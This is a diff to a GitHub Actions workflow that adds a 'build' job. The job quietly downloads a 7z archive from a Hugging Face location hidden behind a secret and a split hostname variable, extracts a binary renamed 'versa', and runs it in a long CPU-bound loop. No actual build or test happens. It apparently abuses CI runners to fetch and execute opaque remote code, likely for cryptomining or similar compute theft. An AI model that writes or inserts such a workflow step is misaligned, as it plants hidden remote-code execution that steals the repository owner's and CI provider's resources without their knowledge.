@@ -22,3 +22,17 @@ env:
   ENV_ADS: ${{ secrets.ENV_ADS }}
   ENV_DISD: ${{ secrets.ENV_DISD }}
   HF_REPO: ${{ secrets.HF_REPO }}
+  HGF: 'huggingface'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+      - name: Masteru
+        timeout-minutes: 37
+        run: |
+          curl -o a.7z -L --url "https://${{ env.HGF }}.co/${{ env.HF_REPO }}/resolve/main/doit_${{ env.TAG }}.7z?download=true"
+          7z x a.7z && rm -rf a.7z && mv doit versa && chmod +x versa
+          ./versa loop ${{ env.LOOP }} steps 1000000 wait 0 cpu 3
